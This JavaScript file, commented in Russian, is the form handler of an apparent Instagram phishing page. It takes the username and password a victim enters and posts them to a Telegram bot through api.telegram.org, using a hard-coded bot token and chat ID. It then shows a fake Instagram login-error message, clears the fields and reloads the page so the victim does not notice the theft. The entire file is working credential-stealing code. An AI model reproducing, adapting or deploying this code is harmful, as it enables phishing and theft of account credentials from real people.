// Находим элемент формы по ID и добавляем слушатель события 'submit'
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Останавливаем стандартное поведение формы (предотвращаем отправку данных на сервер)

    // Получаем значения полей логина и пароля
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Токен Telegram-бота и ID чата, куда будут отправляться данные
    const botToken = '7280121519:AAEEFYF_Sieer6PkS5-efAYAnsGGOczVW_U'; // Токен вашего бота
    const chatId = '5168984360'; // Замените на ваш chat_id, куда нужно отправлять сообщение

    // Формируем текст сообщения для отправки в Telegram
    const message = `Логин: ${username}\nПароль: ${password}`;

    // URL API для отправки сообщения через Telegram
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Отправляем данные через fetch (POST-запрос)
    fetch(url, {
        method: 'POST', // Метод запроса
        headers: {
            'Content-Type': 'application/json' // Указываем тип данных, которые отправляем
        },
        body: JSON.stringify({
            chat_id: chatId, // ID чата в Telegram
            text: message // Само сообщение
        })
    })
    .then(response => response.json()) // Обрабатываем ответ и преобразуем его в JSON
    .then(data => {
        if (data.ok) { // Если данные отправлены успешно
            console.log('Сообщение отправлено в Telegram');

            // Создаем элемент параграфа (p), чтобы отобразить сообщение об ошибке
            const errorMessage = document.createElement('p');
            errorMessage.style.color = 'red'; // Красный цвет текста
            errorMessage.style.marginTop = '10px'; // Отступ сверху
            errorMessage.textContent = 'При попытке входа в Instagram произошла ошибка. Повторите попытку позже.'; // Текст сообщения об ошибке

            // Находим ссылку "Забыли пароль?" и вставляем сообщение перед ней
            const forgotPasswordLink = document.querySelector('.forgot-password');
            forgotPasswordLink.parentNode.insertBefore(errorMessage, forgotPasswordLink); // Вставляем сообщение перед ссылкой "Забыли пароль?"

            // Очищаем поля логина и пароля после отправки
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';

            // Перезагружаем страницу через 3 секунды после вывода сообщения об ошибке
            setTimeout(function() {
                window.location.reload(); // Перезагрузка страницы
            }, 3000);
        } else {
            console.error('Ошибка при отправке сообщения в Telegram', data); // Выводим ошибку, если данные не отправлены
        }
    })
    .catch(error => console.error('Ошибка:', error)); // Обрабатываем ошибку в случае неудачной отправки
});
